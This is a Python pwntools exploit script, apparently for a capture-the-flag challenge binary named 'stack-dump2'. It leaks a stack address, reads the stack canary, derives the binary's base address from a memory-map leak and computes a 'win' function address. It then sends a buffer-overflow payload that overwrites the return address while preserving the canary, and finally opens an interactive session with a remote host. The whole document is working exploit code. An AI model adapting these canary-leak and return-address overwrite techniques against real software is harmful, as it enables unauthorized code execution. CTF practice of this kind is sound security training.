from pwn import *
def get_base_address(memory_map_output):
    for line in memory_map_output.splitlines():
        # Check if the line contains the binary name and an 'r-xp' segment (executable section)
        if '00000000' in line:
            # Extract the base address (start of the memory range)
            base_address = line.split('-')[0].lstrip('$').strip()
            print("base_address is {}".format(base_address))
            return '0x' + base_address
    return None

def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    elif args.HOST:
        p = process(binary_path)
    else:
        context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
        p = gdb.debug('./stack-dump2',
                      gdbscript='''
                          b *0x401319
                          c
                          ''')

    prompt = p.recvuntil(b'[q]uit').decode('utf-8')
    address_match = re.search(r'0x[0-9a-fA-F]+', prompt)
    if address_match:
        address = int(address_match.group(0), 16)  # Convert address to integer
        print("address:", hex(address))

        canary_address = address + 65
        print("Modified address (address + 65):", hex(canary_address))

        # Send the "i" command to the process
        p.sendline(b"i")
        p.recvuntil(b'len:')
        p.sendline(p64(canary_address))

        p.sendline(b"\nd")
        p.recvuntil(b': ').decode('utf-8')
        stack_canary = p.recv(8)
        # stack_canary = stack_canary[::-1]
        print("canary:", stack_canary, len(stack_canary))
        # get win adr
        p.sendline(b"\n\np")
        line = p.recvuntil(b'heap').decode('latin-1').rstrip()
        print('line:', line)
        #
        base_address = get_base_address(line)
        print("base_address:", base_address)
        win_addr_int = int(base_address, 16) + int('0x1219', 16)
        print("win_addr_int:", hex(win_addr_int))
        win_addr = p64(win_addr_int)
        #
        # make bufferoverflow
        p.sendline(b"\n\ni")
        p.recvuntil(b'len:')

        payload = b"A" * 56 + stack_canary + b"A" * 24 + win_addr
        p.sendline(payload)
        print("payload: ", payload)

        p.recvline().decode('utf-8')
        p.recvline().decode('utf-8')
        p.sendline(b"\n\n\nq")


    p.interactive()


# Example usage
interact_with_process('', 'lmao.lol', 5003)
# interact_with_process('../w2/stack-dump')
